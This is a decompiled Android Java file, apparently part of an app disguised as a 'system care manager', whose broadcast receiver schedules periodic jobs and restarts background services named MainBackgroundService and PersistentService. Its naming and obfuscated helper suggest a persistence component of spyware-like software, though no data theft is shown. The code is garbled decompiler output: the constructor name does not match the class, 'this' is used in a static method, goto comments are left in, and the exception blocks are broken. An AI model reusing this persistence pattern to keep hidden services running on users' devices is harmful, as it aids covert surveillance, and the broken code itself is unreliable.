package com.system.caremanager;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

public class SensorManager extends BroadcastReceiver {

    public SensorRestarterBroadcastReceiver() {
        return;
    }

    public static void scheduleJob(Context param1) {
        String str = "jobscheduler";
        Object result = this.getSystemService(str);
        result = (JobScheduler) result;
        ComponentName componentName = new ComponentName();
        Class cls = PersistentJobService.class;
        int SDK_INT = Build$VERSION.SDK_INT;
        int val = 100;
        int val2 = 24;
        if (SDK_INT < val2) {
            // branch: cond_0
        }
        JobInfo.Builder jobInfo.Builder = new JobInfo.Builder();
        JobInfo.Builder result2 = this.setPeriodic(componentName, val);
        JobInfo result3 = this.build();
        // continue loop -> :goto_0
        JobInfo.Builder jobInfo.Builder2 = new JobInfo.Builder();
        JobInfo.Builder result4 = this.setPeriodic(componentName, val);
        JobInfo result5 = this.build();
        int result6 = result.schedule(result);
        return;
    }

    public void onReceive(Context param1, Intent param2) {
        try {
            SensorRestarterBroadcastReceiver.scheduleJob(param1);
            Resources result = param1.getResources();
            int val = 2131296274;
            String result2 = result.getString(val);
            DataPackagingEngine.dataProcessor = result;
            Class cls = MainBackgroundService.class;
            boolean result3 = BackgroundServiceHelper.removedqtractort40(MainBackgroundService.class, param1);
            if (result == null) {
                // branch: cond_0
            }
            Resources result4 = param1.getResources();
            String result5 = result.getString(val);
            DataPackagingEngine.dataProcessor = result;
            Intent intent = new Intent();
            Class cls2 = MainBackgroundService.class;
            ComponentName result6 = param1.startService(intent);
            Class cls3 = PersistentService.class;
            boolean result7 = BackgroundServiceHelper.removedqtractort40(PersistentService.class, param1);
            if (result == null) {
                // branch: cond_4
            }
            Intent intent2 = new Intent();
            Class cls4 = PersistentService.class;
            ComponentName result8 = param1.startService(intent2);
            // continue loop -> :goto_4
            } catch (Exception e) {
                e.printStackTrace();
            Boolean result9 = Boolean.valueOf(1);
            boolean result10 = result.booleanValue();
            if (result == null) {
                // branch: cond_1
            }
            Boolean result11 = Boolean.valueOf(null);
            // continue loop -> :goto_0
            boolean result12 = result.booleanValue();
            if (result == null) {
                // branch: cond_2
            }
            Boolean result13 = Boolean.valueOf(null);
            // continue loop -> :goto_1
            boolean result14 = result.booleanValue();
            if (result == null) {
                // branch: cond_3
            }
            Boolean result15 = Boolean.valueOf(null);
            // continue loop -> :goto_2
            boolean result16 = result.booleanValue();
            if (result == null) {
                // branch: cond_4
            }
            Boolean result17 = Boolean.valueOf(null);
            // continue loop -> :goto_3
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}